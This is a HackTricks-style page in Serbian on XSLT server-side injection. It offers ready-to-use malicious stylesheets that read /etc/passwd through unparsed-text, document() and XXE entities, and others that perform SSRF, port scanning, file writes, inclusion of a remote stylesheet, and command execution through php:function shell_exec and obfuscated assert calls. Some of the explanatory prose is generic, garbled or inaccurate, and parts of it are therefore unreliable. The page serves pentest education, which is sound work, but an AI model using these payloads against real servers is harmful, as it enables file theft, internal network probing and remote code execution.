# XSLT Server Side Injection (Ekstenzibilni jezik transformacija stilova)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kompaniji za kibernetiÄku bezbednost**? Å½elite li da vidite svoju **kompaniju reklamiranu na HackTricks**? Ili Å¾elite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **PridruÅ¾ite se** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na [hacktricks repo](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Osnovne informacije

XSLT je tehnologija koja se koristi za transformaciju XML dokumenata u razliÄite formate. Dolazi u tri verzije: 1, 2 i 3, pri Äemu je verzija 1 najÄeÅ¡Ä‡e koriÅ¡Ä‡ena. Proces transformacije moÅ¾e se izvrÅ¡iti na serveru ili u pregledaÄu.

NajÄeÅ¡Ä‡e koriÅ¡Ä‡eni okviri ukljuÄuju:

- **Libxslt** od Gnome-a,
- **Xalan** od Apache-a,
- **Saxon** od Saxonica-e.

Za iskoriÅ¡Ä‡avanje ranjivosti povezanih sa XSLT, neophodno je da se xsl oznake Äuvaju na serverskoj strani, a zatim pristupiti tom sadrÅ¾aju. Primer takve ranjivosti dokumentovan je u sledeÄ‡em izvoru: [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/).

## Primer - Tutorijal
```bash
sudo apt-get install default-jdk
sudo apt-get install libsaxonb-java libsaxon-java
```
{% code title="xml.xml" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<catalog>
<cd>
<title>CD Title</title>
<artist>The artist</artist>
<company>Da Company</company>
<price>10000</price>
<year>1760</year>
</cd>
</catalog>
```
{% code title="xsl.xsl" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<html>
<body>
<h2>The Super title</h2>
<table border="1">
<tr bgcolor="#9acd32">
<th>Title</th>
<th>artist</th>
</tr>
<tr>
<td><xsl:value-of select="catalog/cd/title"/></td>
<td><xsl:value-of select="catalog/cd/artist"/></td>
</tr>
</table>
</body>
</html>
</xsl:template>
</xsl:stylesheet>
```
{% endcode %}

IzvrÅ¡i:
```xml
saxonb-xslt -xsl:xsl.xsl xml.xml

Warning: at xsl:stylesheet on line 2 column 80 of xsl.xsl:
Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<html>
<body>
<h2>The Super title</h2>
<table border="1">
<tr bgcolor="#9acd32">
<th>Title</th>
<th>artist</th>
</tr>
<tr>
<td>CD Title</td>
<td>The artist</td>
</tr>
</table>
</body>
</html>
```
### Otisak prsta

{% code title="detection.xsl" %}
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
Version: <xsl:value-of select="system-property('xsl:version')" /><br />
Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
<xsl:if test="system-property('xsl:product-name')">
Product Name: <xsl:value-of select="system-property('xsl:product-name')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:product-version')">
Product Version: <xsl:value-of select="system-property('xsl:product-version')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:is-schema-aware')">
Is Schema Aware ?: <xsl:value-of select="system-property('xsl:is-schema-aware')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:supports-serialization')">
Supports Serialization: <xsl:value-of select="system-property('xsl:supportsserialization')"
/><br />
</xsl:if>
<xsl:if test="system-property('xsl:supports-backwards-compatibility')">
Supports Backwards Compatibility: <xsl:value-of select="system-property('xsl:supportsbackwards-compatibility')"
/><br />
</xsl:if>
</xsl:template>
</xsl:stylesheet>
```
{% endcode %}

I izvrÅ¡ite
```xml
$saxonb-xslt -xsl:detection.xsl xml.xml

Warning: at xsl:stylesheet on line 2 column 80 of detection.xsl:
Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<h2>XSLT identification</h2><b>Version:</b>2.0<br><b>Vendor:</b>SAXON 9.1.0.8 from Saxonica<br><b>Vendor URL:</b>http://www.saxonica.com/<br>
```
### ÄŒitanje lokalne datoteke

{% code title="read.xsl" %}
```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
</xsl:template>
</xsl:stylesheet>
```
{% endcode %}
```xml
$ saxonb-xslt -xsl:read.xsl xml.xml

Warning: at xsl:stylesheet on line 1 column 111 of read.xsl:
Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<?xml version="1.0" encoding="UTF-8"?>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
```
### SSRF

Server-Side Request Forgery (SSRF) (Ğ¤Ğ¾Ñ€Ğ¶Ğ¸Ñ€Ğ°Ğ½je zahteva sa servera) je bezbednosna ranjivost koja omoguÄ‡ava napadaÄu da izvrÅ¡i zahteve sa servera na druge interne ili eksterne resurse. Ova ranjivost se Äesto koristi za izvrÅ¡avanje napada kao Å¡to su skeniranje mreÅ¾e, pristup internim servisima ili Äak izvrÅ¡avanje napada na druge sisteme.

SSRF se obiÄno javlja kada aplikacija koristi korisniÄki unos za formiranje URL-a za zahtev. NapadaÄ moÅ¾e da manipuliÅ¡e ovim unosom kako bi izvrÅ¡io zahteve na resurse koji nisu namenjeni javnom pristupu. Na primer, napadaÄ moÅ¾e da izvrÅ¡i zahtev na interni server ili Äak na druge veb aplikacije koje su dostupne na internetu.

Da bi iskoristio SSRF ranjivost, napadaÄ moÅ¾e da koristi razliÄite tehnike, kao Å¡to su:

- KoriÅ¡Ä‡enje URL-ova sa lokalnim IP adresama ili privatnim mreÅ¾nim adresama.
- KoriÅ¡Ä‡enje URL-ova sa loopback adresom (127.0.0.1) kako bi pristupio lokalnim servisima na serveru.
- KoriÅ¡Ä‡enje URL-ova sa specijalnim oznakama ili protokolima koji omoguÄ‡avaju pristup drugim resursima, kao Å¡to su file:// ili gopher://.

Da bi se zaÅ¡titili od SSRF ranjivosti, preporuÄuje se sledeÄ‡e:

- Validacija korisniÄkog unosa kako bi se spreÄilo koriÅ¡Ä‡enje nevaÅ¾eÄ‡ih URL-ova.
- OgraniÄavanje pristupa servera na samo one resurse koji su neophodni za rad aplikacije.
- KoriÅ¡Ä‡enje belih lista (whitelisting) umesto crnih lista (blacklisting) prilikom konfigurisanja dozvoljenih URL-ova.
- Redovno aÅ¾uriranje softvera i primena sigurnosnih zakrpa kako bi se spreÄile poznate ranjivosti koje mogu biti iskoriÅ¡Ä‡ene za SSRF napade.

Ukratko, SSRF je ozbiljna ranjivost koja moÅ¾e omoguÄ‡iti napadaÄu da izvrÅ¡i zahteve sa servera na druge resurse. Implementacija odgovarajuÄ‡ih sigurnosnih mera moÅ¾e pomoÄ‡i u spreÄavanju ovog tipa napada.
```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:include href="http://127.0.0.1:8000/xslt"/>
<xsl:template match="/">
</xsl:template>
</xsl:stylesheet>
```
### Verzije

MoÅ¾e biti viÅ¡e ili manje funkcija u zavisnosti od verzije XSLT-a koja se koristi:

* [https://www.w3.org/TR/xslt-10/](https://www.w3.org/TR/xslt-10/)
* [https://www.w3.org/TR/xslt20/](https://www.w3.org/TR/xslt20/)
* [https://www.w3.org/TR/xslt-30/](https://www.w3.org/TR/xslt-30/)

## Fingerprint

Otpremi ovo i preuzmi informacije
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
Version: <xsl:value-of select="system-property('xsl:version')" /><br />
Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
<xsl:if test="system-property('xsl:product-name')">
Product Name: <xsl:value-of select="system-property('xsl:product-name')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:product-version')">
Product Version: <xsl:value-of select="system-property('xsl:product-version')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:is-schema-aware')">
Is Schema Aware ?: <xsl:value-of select="system-property('xsl:is-schema-aware')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:supports-serialization')">
Supports Serialization: <xsl:value-of select="system-property('xsl:supportsserialization')"
/><br />
</xsl:if>
<xsl:if test="system-property('xsl:supports-backwards-compatibility')">
Supports Backwards Compatibility: <xsl:value-of select="system-property('xsl:supportsbackwards-compatibility')"
/><br />
</xsl:if>
</xsl:template>
</xsl:stylesheet>
```
## SSRF

Server-Side Request Forgery (SSRF) je sigurnosna ranjivost koja omoguÄ‡ava napadaÄu da izvrÅ¡i zahtev sa servera prema drugim resursima na mreÅ¾i. Ova ranjivost se Äesto koristi za izvrÅ¡avanje napada kao Å¡to su povratni kanal zaobilaÅ¾enja sigurnosnih ograniÄenja, skeniranje unutraÅ¡nje mreÅ¾e, pristup internim servisima i izvrÅ¡avanje napada na drugim sistemima.

SSRF se Äesto iskoriÅ¡Ä‡ava kroz unos korisniÄkih podataka koji se prosleÄ‘uju serveru, kao Å¡to su URL-ovi ili IP adrese. NapadaÄ moÅ¾e manipulisati ovim unosima kako bi izazvao server da izvrÅ¡i zahtev prema ciljanim resursima. Ovo moÅ¾e ukljuÄivati pristup internim servisima, kao Å¡to su baze podataka ili administrativni paneli, ili Äak eksternim resursima na internetu.

Da bi se iskoristila SSRF ranjivost, napadaÄ mora pronaÄ‡i naÄin da server izvrÅ¡i zahtev prema ciljanim resursima. To se moÅ¾e postiÄ‡i koriÅ¡Ä‡enjem razliÄitih tehnika, kao Å¡to su URL redirekcija, DNS rekurzija, lokalni IP adrese, mreÅ¾ni interfejsi i drugi.

Da bi se zaÅ¡titili od SSRF ranjivosti, preporuÄuje se validacija i filtriranje korisniÄkih unosa koji se prosleÄ‘uju serveru. TakoÄ‘e je vaÅ¾no ograniÄiti pristup servera ka internim resursima i koristiti sigurnosne mehanizme kao Å¡to su bela lista URL-ova ili sandbox okruÅ¾enja za izvrÅ¡avanje zahteva.
```xml
<esi:include src="http://10.10.10.10/data/news.xml" stylesheet="http://10.10.10.10//news_template.xsl">
</esi:include>
```
## Ubacivanje Javascript koda

Ubacivanje Javascript koda je tehnika koja se koristi za izvrÅ¡avanje zlonamernog koda na ciljnom serveru. Ova tehnika se Äesto koristi u napadima na veb aplikacije kako bi se iskoristile ranjivosti i omoguÄ‡ilo izvrÅ¡avanje neovlaÅ¡Ä‡enih operacija.

### Kako funkcioniÅ¡e?

Kada se izvrÅ¡ava Javascript kod na veb stranici, on ima pristup svim podacima i funkcionalnostima koje su dostupne na toj stranici. To znaÄi da, ako je veb aplikacija ranjiva na Javascript ubacivanje, napadaÄ moÅ¾e da ubaci zlonamerni Javascript kod koji Ä‡e se izvrÅ¡iti na strani servera.

Da bi se izvrÅ¡io Javascript kod na serveru, napadaÄ mora da pronaÄ‘e ranjivost koja omoguÄ‡ava ubacivanje koda. Jedna od uobiÄajenih ranjivosti je nedovoljna validacija korisniÄkog unosa, Å¡to omoguÄ‡ava napadaÄu da ubaci zlonamerni kod putem formulara ili URL parametara.

### Posledice

Ubacivanje Javascript koda moÅ¾e imati ozbiljne posledice po bezbednost veb aplikacije i korisnika. NapadaÄ moÅ¾e da izvrÅ¡i razliÄite vrste napada, kao Å¡to su kraÄ‘a podataka, preusmeravanje korisnika na zlonamerne stranice, ili Äak preuzimanje kontrole nad serverom.

Da bi se zaÅ¡titili od ovakvih napada, veb aplikacije treba da primenjuju odgovarajuÄ‡e sigurnosne mere, kao Å¡to su validacija korisniÄkog unosa, enkripcija podataka i ograniÄavanje privilegija izvrÅ¡avanja Javascript koda.

### Prevencija

Da bi se spreÄilo ubacivanje Javascript koda, veb aplikacije treba da primenjuju sledeÄ‡e sigurnosne mere:

- PaÅ¾ljivo validirati i filtrirati korisniÄki unos kako bi se spreÄilo ubacivanje zlonamernog koda.
- Koristiti sigurne metode za izvrÅ¡avanje Javascript koda, kao Å¡to su Content Security Policy (CSP) i sandbox okruÅ¾enja.
- Redovno aÅ¾urirati veb aplikaciju i sve biblioteke kako bi se ispravile poznate ranjivosti.
- Edukovati razvojni tim o sigurnosnim praksama i ranjivostima koje mogu dovesti do ubacivanja Javascript koda.

Pravilna primena ovih mera moÅ¾e znaÄajno smanjiti rizik od ubacivanja Javascript koda i zaÅ¡tititi veb aplikaciju od napada.
```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<script>confirm("We're good");</script>
</xsl:template>
</xsl:stylesheet>
```
## Prikazivanje direktorijuma (PHP)

### **Opendir + readdir**
```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('opendir','/path/to/dir')"/>
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
</xsl:template></xsl:stylesheet>
```
### **Assert (var\_dump + scandir + false)**

### **Assert (var\_dump + scandir + false)**

Ova tehnika se koristi za izvrÅ¡avanje server-side injekcije XSLT-a (Extensible Stylesheet Language Transformations) kroz kombinaciju funkcija `var_dump` i `scandir`. Ova tehnika je korisna kada je ciljani server konfigurisan tako da izvrÅ¡ava XSLT transformacije.

Da biste iskoristili ovu tehniku, prvo koristite funkciju `var_dump` kako biste prikazali sadrÅ¾aj direktorijuma na ciljanom serveru. Zatim, koristite funkciju `scandir` kako biste dobili listu datoteka i direktorijuma u tom direktorijumu. KonaÄno, koristite `false` kao argument za `assert` funkciju kako biste izvrÅ¡ili server-side injekciju.

Ova tehnika moÅ¾e biti korisna za dobijanje informacija o serveru, kao i za izvrÅ¡avanje dodatnih napada na ciljani sistem. VaÅ¾no je napomenuti da je ova tehnika specifiÄna za servere koji podrÅ¾avaju XSLT transformacije i da moÅ¾e biti ranjiva samo u odreÄ‘enim konfiguracijama.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
<xsl:copy-of name="asd" select="php:function('assert','var_dump(scandir(chr(46).chr(47)))==3')" />
<br />
</body>
</html>
```
## ÄŒitanje fajlova

### **Interno - PHP**
```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', â€˜utf-8')"/>
</xsl:template>
</xsl:stylesheet>
```
### **Interno - XXE**

XXE (Eksterni XML eksploatacioni napad) je vrsta napada koji se koristi za iskoriÅ¡Ä‡avanje slabosti u obradi XML dokumenata. Ovaj napad omoguÄ‡ava napadaÄu da izvrÅ¡i proizvoljan kod na serveru ili da izvrÅ¡i druge zlonamerne radnje.

#### **Kako funkcioniÅ¡e XXE napad?**

XXE napad se obiÄno izvodi ubacivanjem zlonamernog XML sadrÅ¾aja u aplikaciju koja obraÄ‘uje XML dokumente. Kada aplikacija pokuÅ¡a da parsira XML dokument, ona moÅ¾e da izvrÅ¡i eksterni HTTP zahtev ili da pristupi lokalnom fajlu na serveru. Ovo omoguÄ‡ava napadaÄu da izvrÅ¡i proizvoljan kod ili da pristupi osetljivim informacijama.

#### **Kako spreÄiti XXE napade?**

Da biste spreÄili XXE napade, preporuÄuje se sledeÄ‡e:

- Validirajte i filtrirajte ulazne XML dokumente kako biste uklonili ili neutralisali potencijalno zlonamerne sadrÅ¾aje.
- IskljuÄite eksterne entitete i DTD (Document Type Definition) obradu u XML parseru.
- Koristite bezbedne XML parsere koji automatski iskljuÄuju eksterne entitete i DTD obradu.
- AÅ¾urirajte XML parsere na najnovije verzije koje ispravljaju poznate sigurnosne propuste.

#### **ZakljuÄak**

XXE napadi predstavljaju ozbiljnu pretnju za aplikacije koje obraÄ‘uju XML dokumente. Implementacija odgovarajuÄ‡ih sigurnosnih mera, kao Å¡to je validacija i filtriranje ulaznih XML dokumenata, moÅ¾e pomoÄ‡i u spreÄavanju ovih napada.
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "/etc/passwd">]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
&ext_file;
</xsl:template>
</xsl:stylesheet>
```
### **Preko HTTP-a**

XSLT Server-Side Injection (SSI) je tehnika koja se koristi za izvrÅ¡avanje proizvoljnog koda na serveru putem XML ekstenzibilnog jeziÄkog transformacijskog obrasca (XSLT). Ova tehnika se moÅ¾e iskoristiti kada aplikacija prihvaÄ‡a korisniÄki unos u XML formatu i koristi ga za generisanje XSLT transformacijskog obrasca.

Da biste izvrÅ¡ili XSLT SSI napad, prvo morate identifikovati mjesto gdje se korisniÄki unos ubacuje u XSLT transformacijski obrazac. Zatim, umjesto oÄekivanog XML sadrÅ¾aja, ubacite XSLT kod koji Ä‡e biti izvrÅ¡en na serveru.

Jedan od naÄina za izvrÅ¡avanje XSLT SSI napada je slanje HTTP zahtjeva sa specijalno oblikovanim XML tijelom koje sadrÅ¾i XSLT kod. Kada server obradi zahtjev, XSLT transformacijski obrazac Ä‡e biti generisan sa vaÅ¡im ubaÄenim kodom i izvrÅ¡en na serveru.

Ova tehnika moÅ¾e biti vrlo opasna, jer omoguÄ‡ava napadaÄu da izvrÅ¡ava proizvoljan kod na serveru, Å¡to moÅ¾e dovesti do kompromitovanja sistema, kraÄ‘e podataka ili daljnjih napada na druge korisnike.

Da biste se zaÅ¡titili od XSLT SSI napada, preporuÄuje se sanitizacija korisniÄkog unosa i validacija XML sadrÅ¾aja prije generisanja XSLT transformacijskog obrasca. TakoÄ‘e, treba koristiti najnovije verzije softvera i pratiti sigurnosne zakrpe kako bi se smanjio rizik od ovog napada.
```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<xsl:value-of select="document('/etc/passwd')"/>
</xsl:template>
</xsl:stylesheet>
```

```xml
<!DOCTYPE xsl:stylesheet [
<!ENTITY passwd SYSTEM "file:///etc/passwd" >]>
<xsl:template match="/">
&passwd;
</xsl:template>
```
### **Interno (PHP-funkcija)**
```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('file_get_contents','/path/to/file')"/>
</xsl:template>
</xsl:stylesheet>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
<xsl:copy-of name="asd" select="php:function('assert','var_dump(file_get_contents(scandir(chr(46).chr(47))[2].chr(47).chr(46).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100)))==3')" />
<br />
</body>
</html>
```
### Skeniranje portova

Port skeniranje je proces koji se koristi za identifikaciju otvorenih portova na ciljnom raÄunaru ili mreÅ¾i. Ova tehnika omoguÄ‡ava hakerima da otkriju koje usluge ili aplikacije su dostupne na odreÄ‘enim portovima. Kada se otkrije otvoren port, haker moÅ¾e iskoristiti ranjivosti tih usluga ili aplikacija kako bi izvrÅ¡io napad.

Postoje razliÄiti alati i tehnike koje se mogu koristiti za skeniranje portova. Neki od najÄeÅ¡Ä‡e koriÅ¡Ä‡enih alata su Nmap, Masscan i Zmap. Ovi alati omoguÄ‡avaju hakerima da skeniraju veliki broj portova u kratkom vremenskom periodu.

Port skeniranje moÅ¾e biti pasivno ili aktivno. Pasivno skeniranje se odnosi na praÄ‡enje mreÅ¾nog saobraÄ‡aja kako bi se identifikovali otvoreni portovi. Aktivno skeniranje, s druge strane, ukljuÄuje slanje posebnih paketa na ciljne portove kako bi se proverilo da li su otvoreni ili zatvoreni.

VaÅ¾no je napomenuti da je port skeniranje ilegalno bez dozvole vlasnika sistema ili mreÅ¾e. Ova tehnika se Äesto koristi u etiÄkom hakovanju ili pentestiranju kako bi se identifikovali bezbednosni propusti i ranjivosti.
```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="document('http://example.com:22')"/>
</xsl:template>
</xsl:stylesheet>
```
## Pisanje u datoteku

### XSLT 2.0

XSLT 2.0 podrÅ¾ava pisanje u datoteku pomoÄ‡u `xsl:result-document` elementa. Ovaj element omoguÄ‡ava generisanje izlaznih datoteka tokom izvrÅ¡avanja transformacije.

Da biste napisali sadrÅ¾aj u datoteku, prvo morate definisati putanju do ciljne datoteke koristeÄ‡i `href` atribut `xsl:result-document` elementa. Na primer:

```xml
<xsl:result-document href="putanja/do/datoteke.txt">
    <!-- SadrÅ¾aj koji Å¾elite da napiÅ¡ete u datoteku -->
</xsl:result-document>
```

Nakon definisanja putanje do datoteke, moÅ¾ete unutar `xsl:result-document` elementa koristiti bilo koji XSLT izraz za generisanje sadrÅ¾aja datoteke.

Na primer, moÅ¾ete koristiti `xsl:value-of` element za upisivanje vrednosti u datoteku:

```xml
<xsl:result-document href="putanja/do/datoteke.txt">
    <xsl:value-of select="'Ovo je tekst koji Ä‡e biti upisan u datoteku.'" />
</xsl:result-document>
```

TakoÄ‘e moÅ¾ete koristiti `xsl:copy-of` element za kopiranje sadrÅ¾aja izvornog XML dokumenta u ciljnu datoteku:

```xml
<xsl:result-document href="putanja/do/datoteke.txt">
    <xsl:copy-of select="." />
</xsl:result-document>
```

Napomena: Da biste koristili `xsl:result-document` element, vaÅ¡ XSLT procesor mora podrÅ¾avati XSLT 2.0 standard.
```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:result-document href="local_file.txt">
<xsl:text>Write Local File</xsl:text>
</xsl:result-document>
</xsl:template>
</xsl:stylesheet>
```
### **Xalan-J ekstenzija**

Xalan-J je implementacija XSLT (Extensible Stylesheet Language Transformations) procesora napisana u programskom jeziku Java. Ova ekstenzija omoguÄ‡ava izvrÅ¡avanje XSLT transformacija na serveru. Xalan-J ekstenzija moÅ¾e biti iskoriÅ¡Ä‡ena za izvrÅ¡avanje server-side injekcije putem XSLT fajlova.

Da biste iskoristili ovu ranjivost, potrebno je pronaÄ‡i mesto gde se XSLT fajl koristi za transformaciju XML podataka. Zatim, moÅ¾ete ubaciti zlonamerni kod u XSLT fajl kako biste izvrÅ¡ili proizvoljan kod na serveru.

NapadaÄ moÅ¾e iskoristiti Xalan-J ekstenziju za izvrÅ¡avanje razliÄitih napada, kao Å¡to su Äitanje i pisanje fajlova na serveru, izvrÅ¡avanje sistemskih komandi, preuzimanje osetljivih podataka i joÅ¡ mnogo toga.

VaÅ¾no je napomenuti da je ova ranjivost specifiÄna za Xalan-J implementaciju XSLT procesora i ne odnosi se na sve XSLT procesore.
```xml
<xsl:template match="/">
<redirect:open file="local_file.txt"/>
<redirect:write file="local_file.txt"/> Write Local File</redirect:write>
<redirect:close file="loxal_file.txt"/>
</xsl:template>
```
## UkljuÄivanje spoljnih XSL fajlova

Kada koristite XSLT server-side injection, moÅ¾ete ukljuÄiti spoljne XSL fajlove kako biste pisali fajlove u PDF formatu. Ovo vam omoguÄ‡ava da iskoristite funkcionalnosti eksternih XSL fajlova za manipulaciju PDF datotekama.

Da biste to postigli, moÅ¾ete koristiti `document()` funkciju u XSLT kodu kako biste uÄitali spoljni XSL fajl. Zatim moÅ¾ete koristiti XSLT transformacije da biste generisali PDF datoteku sa Å¾eljenim sadrÅ¾ajem.

Na primer, moÅ¾ete ukljuÄiti spoljni XSL fajl koji sadrÅ¾i XSLT transformacije za generisanje PDF datoteke. Zatim moÅ¾ete koristiti ove transformacije da biste generisali PDF datoteku sa Å¾eljenim sadrÅ¾ajem, kao Å¡to su tekst, slike ili tabele.

VaÅ¾no je napomenuti da prilikom koriÅ¡Ä‡enja ove tehnike treba biti oprezan da se ne dozvoli neovlaÅ¡Ä‡en pristup ili manipulacija sa sistemom. TakoÄ‘e, treba proveriti da li je platforma koju koristite podrÅ¾ava ovu funkcionalnost i da li postoje odgovarajuÄ‡e bezbednosne mere zaÅ¡tite.
```xml
<xsl:include href="http://extenal.web/external.xsl"/>
```

```xml
<?xml version="1.0" ?>
<?xml-stylesheet type="text/xsl" href="http://external.web/ext.xsl"?>
```
## IzvrÅ¡avanje koda

### **php:function**
```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('shell_exec','sleep 10')" />
</xsl:template>
</xsl:stylesheet>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
<xsl:copy-of name="asd" select="php:function('assert','var_dump(scandir(chr(46).chr(47)));')" />
<br />
</body>
</html>
```
IzvrÅ¡ite kod koristeÄ‡i druge okvire u PDF-u

### **ViÅ¡e jezika**

**Na ovoj stranici moÅ¾ete pronaÄ‡i primjere RCE-a u drugim jezicima:** [**https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt\_injection#C%23%2FVB.NET%2FASP.NET**](https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt\_injection#C%23%2FVB.NET%2FASP.NET) **(C#, Java, PHP)**

## **Pristup PHP statiÄkim funkcijama iz klasa**

SljedeÄ‡a funkcija Ä‡e pozvati statiÄku metodu `stringToUrl` klase XSL:
```xml
<!--- More complex test to call php class function-->
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"
version="1.0">
<xsl:output method="html" version="XHTML 1.0" encoding="UTF-8" indent="yes" />
<xsl:template match="root">
<html>
<!-- We use the php suffix to call the static class function stringToUrl() -->
<xsl:value-of select="php:function('XSL::stringToUrl','une_superstring-Ã Ã”|modifier')" />
<!-- Output: 'une_superstring ao modifier' -->
</html>
</xsl:template>
</xsl:stylesheet>
```
(Primer sa [http://laurent.bientz.com/Blog/Entry/Item/using\_php\_functions\_in\_xsl-7.sls](http://laurent.bientz.com/Blog/Entry/Item/using\_php\_functions\_in\_xsl-7.sls))

## ViÅ¡e Payloadova
* Proverite [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection)
* Proverite [https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt_injection](https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt_injection)

## **Lista za otkrivanje Brute-Force napada**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xslt.txt" %}

## **Reference**

* [XSLT\_SSRF](https://feelsec.info/wp-content/uploads/2018/11/XSLT\_SSRF.pdf)\\
* [http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20IO%20Active.pdf](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20IO%20Active.pdf)\\
